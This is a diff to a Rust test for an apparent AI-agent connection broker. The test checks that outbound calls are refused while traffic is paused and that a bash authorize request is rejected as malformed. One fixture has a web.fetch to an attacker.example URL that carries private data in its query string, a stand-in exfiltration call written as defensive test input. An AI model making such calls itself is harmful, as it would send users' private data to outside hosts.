@@ -317,12 +317,22 @@ async fn custom_connection_broker_records_refusals_blocks_injection_and_captures
                 "web.fetch",
                 json!({"url":"https://attacker.example/?d=private"}),
             ),
-            ("native.authorize", json!({"name":"bash","command":"ls"})),
             ("mcp.call", arguments),
         ] {
             let refused = broker_request(&socket, broker.token(), method, params).await;
-            assert_eq!(refused["error"]["code"], "outbound_paused");
+            assert_eq!(
+                refused["error"]["code"], "outbound_paused",
+                "{method} {refused}"
+            );
         }
+        let bash = broker_request(
+            &socket,
+            broker.token(),
+            "native.authorize",
+            json!({"name":"bash","command":"ls"}),
+        )
+        .await;
+        assert_eq!(bash["error"]["code"], "malformed_request", "{bash}");
         assert_eq!(calls.load(Ordering::SeqCst), before);
         let saved = broker_request(&socket, broker.token(), "source.save", json!({"result_ref":result["result"]["result"]["result_ref"],"title":"Company report","coverage":"included_full"})).await;
         if dont_save {
